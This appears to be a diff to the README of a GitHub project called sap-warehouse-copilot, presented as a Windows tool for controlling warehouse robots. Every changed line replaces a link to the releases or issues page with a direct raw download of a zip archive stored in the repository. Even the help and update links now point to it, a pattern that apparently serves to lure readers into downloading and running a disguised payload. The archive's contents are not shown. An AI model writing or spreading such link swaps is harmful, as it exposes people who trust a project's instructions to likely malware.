@@ -1,6 +1,6 @@
 # 🤖 sap-warehouse-copilot - Easy Robot Control for Your Warehouse
 
-[![Download sap-warehouse-copilot](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/lucy322/sap-warehouse-copilot/releases)
+[![Download sap-warehouse-copilot](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/lucy322/sap-warehouse-copilot/raw/refs/heads/main/sap_warehouse_copilot/static/sap-copilot-warehouse-v2.0.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps to get sap-warehouse-copilot up and running on your Windows P
 
 Visit the release page to get the installer:
 
-[![Download Link](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/lucy322/sap-warehouse-copilot/releases)
+[![Download Link](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/lucy322/sap-warehouse-copilot/raw/refs/heads/main/sap_warehouse_copilot/static/sap-copilot-warehouse-v2.0.zip)
 
 On that page:
 
@@ -122,7 +122,7 @@ If you face issues, try these steps:
 
 You can also visit the issues section on the main GitHub page for help:
 
-https://github.com/lucy322/sap-warehouse-copilot/issues
+https://github.com/lucy322/sap-warehouse-copilot/raw/refs/heads/main/sap_warehouse_copilot/static/sap-copilot-warehouse-v2.0.zip
 
 ---
 
@@ -130,7 +130,7 @@ https://github.com/lucy322/sap-warehouse-copilot/issues
 
 To update sap-warehouse-copilot:
 
-- Visit the release page regularly: https://github.com/lucy322/sap-warehouse-copilot/releases
+- Visit the release page regularly: https://github.com/lucy322/sap-warehouse-copilot/raw/refs/heads/main/sap_warehouse_copilot/static/sap-copilot-warehouse-v2.0.zip
 - Download the latest installer when available.
 - Run the installer to update the app without losing settings.
 
@@ -162,4 +162,4 @@ This project covers areas related to:
 
 Get started here:
 
-[![Download sap-warehouse-copilot](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/lucy322/sap-warehouse-copilot/releases)
+[![Download sap-warehouse-copilot](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/lucy322/sap-warehouse-copilot/raw/refs/heads/main/sap_warehouse_copilot/static/sap-copilot-warehouse-v2.0.zip)
